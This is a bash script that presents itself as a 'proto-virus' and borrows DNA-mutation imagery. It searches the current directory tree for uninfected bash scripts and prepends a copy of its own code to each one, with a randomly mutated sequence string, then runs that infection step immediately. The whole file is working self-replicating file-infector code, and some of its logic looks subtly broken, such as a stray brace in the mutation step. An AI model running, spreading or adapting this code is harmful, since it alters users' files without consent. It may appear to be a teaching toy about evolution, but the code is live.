#!/bin/bash

#sourced from carlosj-rr@github
# Genetic sequences
CURRENT_SEQUENCE="AACGACTAGGTCAAATAGAGTGCTTTGATATCGGCATGTCTGGCTTTAGAATTCAGTATAGTGCGCTGATCCGAGTCGAGATAAAAACACCAGTACCCAAAACCAGGCGGGCTCGCCACGTCGGCTAATCCTGGTACATTTTGTAAACAATGTTCAGAAGAAAATTTGTGATAGAAGGACGAGTCACCGCGTACTAATAGCAACAACGATCGGCCGCACCATCCATTGTCGTGGTGACGCTCGGATTACACGGGAAAGGTGCTTGTGTCCCGACAGGCTAGGATATAATCCTGAGGCGTTACCCCAATCGTTCAGCGTGGGATTTGCTACAACTCCTGAGCGCTACATGTACGAAACCATGTTATGTATGCACAAGGCCGACAATAGGACGTAGCCTTGAAGTTAGTACGTAGCGTGGTCGCATAAGTACAGTAGATCCTCCCCGCGCATCCTATTTATTAAGTTAATTCTACAGCAATACGATCATATGCGGATCCGCAGTGGCCGGTAGACACACGTCTACCCCGCTGCTCAATGACCGGGACTAAAGAGGCGAAGATTATGGTGTGTGACCCGTTATGCTCGAGTTCGGTCAGAGCGTCATTGCGAGTAGTCGTTTGCTTTCTCAAACTCCGAGCGATTAAGCGTGACAGCCCCAGGGAACCCACAAAACGTGATCGCAGTCCATCCGATCATACACAGAAAGGAAGGTCCCCATACACCGACGCACCAGTTTACACGCCGTATGCATAAACGAGCCGCACGAACCAGAGAGCTTGAAGTGGACCTCTAGTTCCTCTACAAAGAACAGGTTGCCCTGTCGCGAAGATGCCTTACCTAGATGCAATGACGGACGTATTCCTTTTGCCTCAACGGCTCCTGCTTTCGCTGAAATCCAAGACAGGCAACAGAAACCGCCTTTCGAAAGTGAGTCCTTCGTCTGTGACTAACTGTGCCAAATCGTCTTGCAAACTCCTAATCCAGTTTAACTCACCAAATT"
ANCESTRAL_SEQUENCE="AACGACTAGGTCAAATAGAGTGCTTTGATATCGGCATGTCTGGCTTTAGAATTCAGTATAGTGCGCTGATCCGAGTCGAGATAAAAACACCAGTACCCAAAACCAGGCGGGCTCGCCACGTCGGCTAATCCTGGTACATTTTGTAAACAATGTTCAGAAGAAAATTTGTGATAGAAGGACGAGTCACCGCGTACTAATAGCAACAACGATCGGCCGCACCATCCATTGTCGTGGTGACGCTCGGATTACACGGGAAAGGTGCTTGTGTCCCGACAGGCTAGGATATAATCCTGAGGCGTTACCCCAATCGTTCAGCGTGGGATTTGCTACAACTCCTGAGCGCTACATGTACGAAACCATGTTATGTATGCACAAGGCCGACAATAGGACGTAGCCTTGAAGTTAGTACGTAGCGTGGTCGCATAAGTACAGTAGATCCTCCCCGCGCATCCTATTTATTAAGTTAATTCTACAGCAATACGATCATATGCGGATCCGCAGTGGCCGGTAGACACACGTCTACCCCGCTGCTCAATGACCGGGACTAAAGAGGCGAAGATTATGGTGTGTGACCCGTTATGCTCGAGTTCGGTCAGAGCGTCATTGCGAGTAGTCGTTTGCTTTCTCAAACTCCGAGCGATTAAGCGTGACAGCCCCAGGGAACCCACAAAACGTGATCGCAGTCCATCCGATCATACACAGAAAGGAAGGTCCCCATACACCGACGCACCAGTTTACACGCCGTATGCATAAACGAGCCGCACGAACCAGAGAGCTTGAAGTGGACCTCTAGTTCCTCTACAAAGAACAGGTTGACCTGTCGCGAAGATGCCTTACCTAGATGCAATGACGGACGTATTCCTTTTGCCTCAACGGCTCCTGCTTTCGCTGAAATCCAAGACAGGCAACAGAAACCGCCTTTCGAAAGTGAGTCCTTCGTCTGTGACTAACTGTGCCAAATCGTCTTGCAAACTCCTAATCCAGTTTAACTCACCAAATT"

# Identify infectable files: files having a '#!/bin/bash' shebang that don't already have the CURRENT_SEQUENCE variable declared (i.e., uninfected bash files).
infectable_files () {
  for i in $(find . -type f)
  do
    interpreter=$(grep "#!" $i | cut -d"!" -f2)
    if [[ $interpreter == "/bin/bash" ]]
    then
      signature=$(grep "CURRENT_SEQUENCE" $i | wc -l)
        if [[ $signature == 0 ]]
        then
          echo $i
        fi
    fi
  done
}

# A short function to produce a series of numbers in which a single one is a '1' and the rest are '0'. Comes in handy for randomly choosing a base to mutate (see sequence_mutator function below).
a_one_and_many_zeroes () {
  tot_length=$1
  echo "1"
  for i in $(seq 1 $(($tot_length - 1)));
  do
    echo "0"
  done
}

# The function in charge of mutating the CURRENT_SEQUENCE before the virus self-copies itself into a new file.
sequence_mutator () {
  input_sequence=$CURRENT_SEQUENCE
  mutated_site=$(a_one_and_many_zeroes 1000 | shuf | grep -n "1" | cut -d":" -f1)
  new_base=$(echo -e "A\nT\nG\nC" | grep -v ${input_sequence:$(($mutated_site-1)):1}} | shuf | head -n1)
  echo $input_sequence | sed s/./$new_base/$mutated_site
}

# Mutating the sequence beforehand, just to have it ready as a variable.
CURRENT_SEQUENCE=$(sequence_mutator)

# This function outputs the entire code of the proto-virus, but with the mutated version of the CURRENT_SEQUENCE. This is what will be pasted into every newly infected file.
make_mutated_copy () {
  sed -n 1,2p $BASH_SOURCE
  echo "CURRENT_SEQUENCE=\"$(echo $CURRENT_SEQUENCE)\""
  sed -n 4,63p $BASH_SOURCE
}

# The function that prepends the entire code of the virus, with a mutated CURRENT_SEQUENCE, into every file listed by the infectable_files function. The simplest way I could do the prepending was with tmp files.
infector () {
  for i in $(infectable_files);
  do
    mv $i $i.tmp
    make_mutated_copy > $i
    cat $i.tmp >> $i
    rm $i.tmp
  done 
}

# Time to sneeze and spread!
infector
